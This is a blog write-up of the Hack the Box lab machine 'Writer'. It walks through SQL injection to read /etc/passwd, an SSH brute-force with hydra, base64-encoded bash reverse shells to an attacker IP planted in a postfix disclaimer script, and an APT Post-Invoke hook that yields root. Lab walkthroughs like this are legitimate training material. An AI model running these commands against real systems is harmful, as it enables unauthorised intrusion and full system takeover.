+++
author = "Alcadramin"
title = "Hack the Box - Writer (Writeup)"
date = "2021-12-11"
description = "Hack the Box machine Writer walkthrough."
tags = ["HacktheBox", "Writeup", "SQL Injection", "Hacking"]
series = ["Dev Blogs"]
+++

Hello guys! This is my first blog post. I am planning to post **Hack the Box** writeups, Web Dev logs and also my Kaggle journeys. Today I am going to work on [Writer](https://app.hackthebox.com/machines/361).

- This post is cross posted at [Dev.to](https://dev.to/alcadramin/lets-hack-this-box-writer-writeup-5a30). You can read it there if you wish.

> Before start, please try to pawn this machine by **yourself** first.

"Writer" is rated as Medium difficulty (Linux) machine, we'll see how it goes! I usually start with nmap to see what's going on.

- **nmap** is a must have tool to find open ports, services, which OS host uses etc.

## nmap scan

```bash
alcadramin@archlinux ➜ ~  sudo nmap -sC -sV -sS -A 10.10.11.101
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-03 07:00 +03
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 07:00 (0:00:00 remaining)
Nmap scan report for 10.10.11.101
Host is up (0.075s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/3%OT=22%CT=1%CU=42753%PV=Y%DS=2%DC=T%G=Y%TM=61A9966
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 15m52s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-12-03T04:16:28
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   73.43 ms 10.10.14.1
2   73.95 ms 10.10.11.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.84 seconds
```

We can clearly see that we've a HTTP server let's check what's inside 👀.

![Writer Website](/images/htb-writer/1.jpeg)

## Finding URI's with gobuster

Nothing interesting, let's find URI's (directories) with `gobuster`, which usually leads us to some goodies.

[Gobuster](https://github.com/OJ/gobuster) is a tool used to brute-force:

- URIs (directories and files) in web sites.
- DNS subdomains (with wildcard support).
- Virtual Host names on target web servers.
- Open Amazon S3 buckets

```bash
alcadramin@archlinux ➜ wordlists  gobuster dir -u 10.10.11.101 -w directory-list-2.3-small.txt
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/03 07:22:14 Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 4905]
/about                (Status: 200) [Size: 3522]
               (Status: 301) [Size: 313] [--> http://10.10.11.101/]
/logout               (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/dashboard            (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/administrative       (Status: 200) [Size: 1443]

===============================================================
2021/12/03 07:33:27 Finished
===============================================================
```

`administrative` seem's interesting.

![Administrative Page](/images/htb-writer/2.png)

We've a good old login form, we can check if it's vulnerable to SQL injections, request capturing etc. Let's take a look with **Burp Suite**!

![Burp POST](/images/htb-writer/3.png)

## SQL Injection

Hmm, I've tried weak passwords etc. nothing works, let's try with UNION which is a common SQL vulnerability.

![Burp SQL Query](/images/htb-writer/4.png)

Yay! 🎉 It is vulnerable to SQL injections. I'm just gonna try this request with `sqlmap` as well. PS: Just copy the request from Burp and save it to a file then pass it to `sqlmap` with `-r`.

```bash
alcadramin@archlinux ➜ Writer  sqlmap -r request
```

![sqlmap](/images/htb-writer/5.jpeg)

Yep it's very clear now, let's continue with Burp.

![Burp Injection Success](/images/htb-writer/6.png)

![Burp Injection Success Page Render](/images/htb-writer/7.png)

We're in. I am going to login with `admin' ;**^` query. I've checked dashboard and found we can try to upload image and try to get shell however since we can SQL inject, I'm gonna find users and try to brute-force ssh.

![Dashboard](/images/htb-writer/8.png)

So I've just quickly writed down an injection (you can see the original one in sqlmap screenshot) to get `/etc/passwd`.

![Burp Injection passwd](/images/htb-writer/9.png)

We can see our users!

![Burp Injection passwd 2](/images/htb-writer/10.png)

## SSH Brute-force

We've `kyle` and `john`, let's try to brute-force `kayle` with `hydra`. (I've tried `john` as well and waited long time couldn't crack it, so gonna continue with `kyle`)

```bash
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
```

```
salcadramin@archlinux ➜ Writer  sudo hydra -l kyle -P ~/pwn/wordlists/rockyou.txt ssh://10.10.11.101 -VV -f -t 60
```

Not so long after, we've found their password!

![hydra](/images/htb-writer/11.png)

And let's connect with ssh! (Someone was already here)

![shell 1](/images/htb-writer/12.png)

Let's check the ports see if we can find something vulnerable.

![netstat](/images/htb-writer/13.png)

We can get our user hash now, unfortunately `kyle` doesn't have sudo access so we'll try to reverse shell to `john` with SMTP. (No suprise 👀)

After some research I've come accross with this repository, which basically allows you to remap ports to desired one : https://github.com/cw1997/NATBypass

I'm going to compile it and upload to `kyle` with sftp.

```bash
alcadramin@archlinux ➜ ~  sftp kyle@10.10.11.101
kyle@10.10.11.101's password:
Connected to 10.10.11.101.
sftp> put /home/alcadramin/pwn/natbypass
```

Generate the reverse shell payload with base64.

```bash
alcadramin@archlinux ➜ ~  echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.174/7678 0>&1"' | base64
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTc0LzMxMzYgMD4mMSI=
```

Let's run the tool and bind it to a random IP.

![Natbypass](/images/htb-writer/14.png)

Now we'll add our payload to `/etc/postfix/disclaimer` and listen through `ncat`.

![Revshell](/images/htb-writer/15.png)

```bash
echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTc0Lzc2NzggMD4mMSI= | base64 -d | bash
```

Now that they're done, I'm gonna write a script with Ruby to send an email and execute the payload.

```rb
#!/usr/bin/env ruby

require 'net/smtp'
require 'openssl'
OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE

message = <<MESSAGE_END
Hey John, give me your shell pls.
MESSAGE_END

Net::SMTP.start('10.10.11.101', 3137) do |smtp|
  smtp.send_message message, 'kyle@10.10.11.101', 'john@10.10.11.101'
end
```

Hey we're in John now. I've quickly realise there is a private ssh key, so I can use that to connect with ssh!

![nc capture](/images/htb-writer/16.png)

![ssh key](/images/htb-writer/17.jpeg)

We can check John's groups.

```bash
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

I am just gonna upload `pspy64` to John via sftp and check running processes.

```bash
alcadramin@archlinux ➜ Writer  sftp -i john_key john@10.10.11.101
Connected to 10.10.11.101.
sftp> put /home/alcadramin/pwn/pspy64
```

## Privilege Escalation

So I ran `pspy64` and realise this naughty boy is running APT via cron and we also have access to APT hooks so we can create a payload in `/etc/apt/apt.conf.d`. (https://wiki.debian.org/AptConfiguration)

```bash
2021/12/03 18:08:02 CMD: UID=0    PID=27301  | /usr/bin/apt-get update
2021/12/03 18:09:01 CMD: UID=0    PID=27326  | /usr/sbin/CRON -f
```

```bash
echo 'APT::Update::Post-Invoke {"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTc0LzEyMTIgMD4mMSI= | base64 -d | bash"};'> 01payload
```

And we got root access!

![root](/images/htb-writer/18.png)

Finally I'm submitting my hashes!

![pawned](/images/htb-writer/19.png)

- Thank you for reading this article, hope you've had fun and learned something! See you next time!
